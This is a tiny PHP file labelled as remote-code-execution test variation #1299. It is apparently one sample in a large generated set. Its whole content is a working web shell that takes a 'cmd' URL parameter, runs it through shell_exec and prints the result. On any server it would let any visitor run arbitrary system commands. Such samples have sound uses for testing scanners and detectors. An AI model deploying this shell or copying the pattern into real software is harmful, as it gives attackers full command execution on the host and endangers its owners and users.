<?php
// RCE test variation #1299
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>